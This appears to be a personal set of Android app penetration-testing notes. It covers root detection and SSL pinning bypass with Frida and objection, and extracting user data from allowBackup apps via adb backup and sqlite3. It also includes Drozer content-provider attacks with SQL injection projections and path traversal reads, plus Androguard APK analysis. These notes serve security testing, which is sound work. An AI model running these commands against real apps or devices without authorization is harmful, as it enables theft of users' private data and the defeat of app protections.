Pentesting android app


Root Detection bypass 

start the frida server 
connect adb devies and data/local
./frida-server 

now bypass root detection (new tab) - by the start the app and minimize 

-> frida --codeshare dzonerzy/fridantiroot PACKAGE_NAME -U --no-pause 

->> %resume

start the objection (new tab)

-> objection --gadget PACKAGENAME explore 

// will start the objection cli 

-> android intent launch_activity ACTIVITYNAME
 
// WILL START THE ACTIVITY AND BYPASS ROOT DETECTION BYPASS 

open every in new terminal 

-> adb shell 

-> cd /data/local

-> ./frida-server-14.2.12-android-x86 
-> ./frida-server-14.2.12-android-x86 &    ---/ run frida in background
start the application

-> frida --codeshare dzonerzy/fridantiroot com.packagename -U --no-pause 

resmume
-> objection --gadget PACKAGENAME explore 

->> android intent launch_activity activityname 

-------------------------------------------------------------------
Unrestricted backup file - ALLOWED BACKUP = TRUE 

1 - android manifest - check - allow backup = true 
2 - adb backup -f filename.ab com.android (package name)
3 - abe.jar github \\ google it
4 - github.com/nelenkov/android-backup-extractor - clone it this will convert in tar 
5 - https://sourceforge.net/projects/android-backup-processor/files/latest/download or download from here
6 - https://sourceforge.net/projects/android-backup-processor/files/ 
7 - java -jar /home/kali/Downloads/android-backup-extractor-20210530-bin/abe.jar unpack /home/kali/Desktop/filename.ab   /home/kali/Desktop/filename.tar 1234
8 - unzip the tar file 
9 - cd ~/home/kali/Desktop/apps/com.android.fileupload/db/   --/ db locate
10 - sqlite3 UserDB.db 
11 - .tables
12 - select * from table_name \\ list the userdata in plain text 
13 - 


----------------------------------------------------------------------------------------------------------
https://www.youtube.com/watch?v=vwrFoMoB9nE 
Multiple ways to #bypass #Android #SSL #PINNING | #frida #objection #apkmitm - BONUS TUTORIAL
----------------------------------------------------------------------------------------------------------

ssl unpinning - android app via mobexler

1 - Download the fridaserver - as per the mobexler version - https://github.com/frida/frida/releases/download/14.2.12/frida-server-14.2.12-android-x86_64.xz
                                                             https://github.com/frida/frida/releases/download/14.2.12/frida-server-14.2.12-android-x86.xz
2 - adb push frida-server-14.2.12-x86_64 /data/local/
3 - adb shell 
4 - chmod +x frida-server-14.2.12-x86_64    or chmod 777 frida-server-14.2.12-x86_64   or refer this article 
https://infosecwriteups.com/hail-frida-the-universal-ssl-pinning-bypass-for-android-e9e1d733d29
5 - frida-ps -U
6 - frida-ps -Uai 
7 - //frida -U -f <your_application_package_name> -l <path_to_fridascript.js_on_your_computer> --no-paus
frida -U -f com.twitter.android -l D:\frida\fridascript.js --no-paus
8 - frida -U -l sslpinning.js -f com.package.name --no-pause
9 - app will stop working you have to relauch app without clearing cache

----------------------------------------------------------------------------------------------------
https://mobexler.com/checklist.htm#android

-------------------------------------------------------------------------------------------------
connect the android device with mobexler and setup adb 

1 - goto settings - aboutphone - buildnumber - turn on usb debugging 
2 - install ADB in windows 
3 - https://dl.google.com/android/repository/platform-tools-latest-windows.zip 
4 - extract and set the path in edit environment variable in path D:\kanhaiya\PROJECT\10 worldline\files_android_lab\platform-tools
5 - add the path in the systemvariable. 
6 - launch the cmd and type --- adb 
7 - adb devices 
8 - adb connect 192.168.0.1:5555 (genymotion device ip \ default port)
9 - adb shell 
10 - adb push /mnt/sdcard/download  --- push filedevices 
11 - adb pull /mnt/sdcard/filename.cs
12 - adb start-server
13 - adb kill-server
14 - adb devices 
15 - adb -s emulator-5554 install APK_Name.apk    --> this will allow to install the apk via adb in android device

-----------------------------------------------------------------------------------------------

Drozer - for dynamic analysis for android application 

1 - start the drozer 

--> adb forward tcp:31415 tcp:31415
    adb shell am startservice -n com.mwr.dz/.service.ServerService -c com.mwr.dz.START.EMBEDDED
    drozer console connect 

or to run globally cp this file to bin directory 


--> save this file as .sh extention eg: drozer-start.sh 

--> cp drozer-start.sh /bin


2 - before starting drozer install the drozer apk in android emulator or android device 

visit this link - download android apk - https://labs.f-secure.com/tools/drozer/

3 - Start drozer (Manually)- Install Drozer Agent APK in Genymotion and ON server- Launch Terminal - "adb forward tcp:31415 tcp:31415"- "drozer console connect" 

4 - Usage 

To get a list of all the installed apps - "run app.package.list"

To find the attack surface - "run app.package.attacksurface [pkg-name]"

To understand what this module does - “help module-name”

To gather for activity information - “run app.activity.info -a package-name”

To run activity component - “run app.activity.start –component package-name activity-name”

Finding the content providers - "run.app.provider.finduri [pkg-name]" or scanner

Querying the content provider- "run app.provider.query [content-uri]" 

Find the vulnerable content provider -"run scanner.provider.finduris -a [pkg-name]"

Query the content provider- “run app.provider.query content://uri” 

Scan the provider for injection vulnerability - “run scanner.provider.injection -a package-name”

Issue the query to sql injection to check tables  - “run app.provider.query content://url –projection --projection "* FROM SQLITE_MASTER WHERE type='table';--" ”

Extract the data from tables - run app.provider.query content://uri --projection "* FROM note--"

Reading files via content provider -"run app.provider.read [content-uri]/../../[file-name]"


--------------------------------------------------------------------------------------------

5 - Androguard 
Reverse Engineering and Malware Analysis framework
Open Source 
Really handy for analyzing application
https://github.com/androguard/androguard
https://resources.infosecinstitute.com/topic/android-penetration-tools-walkthrough-series-androguard/

Load up Androguard - Androlyze, Androsim, Androsign, etc.
Get all the activities, permissions and services 
How to find classes and methods? 
What about source code?


androlyze -s 
myapp = APK(‘path/of/apk’)
myapp.get_activities()
myapp.get_permission()
myapp.get_providers()

press the tab after variable created myapp. + tab only in mobexler 

myapp.androidversion
myapp.arsc
myapp.axml
myapp.filename
myapp.files
myapp.files_crc32
myapp.format_value
myapp.get_AndroidManifest
myapp.get_activities
myapp.get_android_manifest_axml
myapp.get_android_manifest_xml
myapp.get_android_resources
myapp.get_androidversion_code
myapp.get_androidversion_name
myapp.get_certificate
myapp.get_details_permissions
myapp.get_dex
myapp.get_element
myapp.get_elements
myapp.get_files
myapp.get_filename
myapp.get_file
myapp.get_files_crc32
myapp.get_files_information
myapp.get_files_types
myapp.get_intent_filters
myapp.get_libraries
myapp.get_main_activity
myapp.get_max_sdk_version
myapp.get_min_sdk_version
myapp.get_package
myapp.get_permissions
myapp.get_providers
myapp.get_raw
myapp.get_receivers
myapp.get_services
myapp.get_signature
myapp.get_signature_name
myapp.get_target_sdk_version
myapp.is_valid_apk
myapp.magic_file
myapp.new_zip
myapp.package
myapp.permissions
myapp.show
myapp.valid_apk
myapp.xml
myapp.zip
myapp.zipmodule



--------------------------------------------------------------------------

Start the intent activity with adb 

adb shell am start -n package.name/activityname

--------------------------------------------------------------------------










